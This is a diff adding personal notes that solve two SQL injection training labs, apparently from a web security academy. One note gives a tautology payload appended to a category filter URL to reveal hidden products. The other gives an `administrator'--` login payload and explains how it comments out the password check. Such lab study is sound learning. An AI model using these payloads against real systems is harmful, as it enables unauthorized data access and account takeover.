@@ -1,0 +1,13 @@
+SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+	https://ac3a1faa1f1cd9be80dc2c2e00ff00b9.web-security-academy.net/filter?category=All'+OR+1=1--
+	Add to the end of the url the following string: filter?category=All'+OR+1=1--
+	
+
+SQL injection vulnerability allowing login bypass
+	Go the login page
+	type in the username field: administrator'--
+	This username triggers the server to produce a SQL statement that matching first the username
+	as the administrator, treats the rest of the statement where the password matching happens as a comment
+	Hence, it doesn't check the password of the user entered
+	type anything in the password field
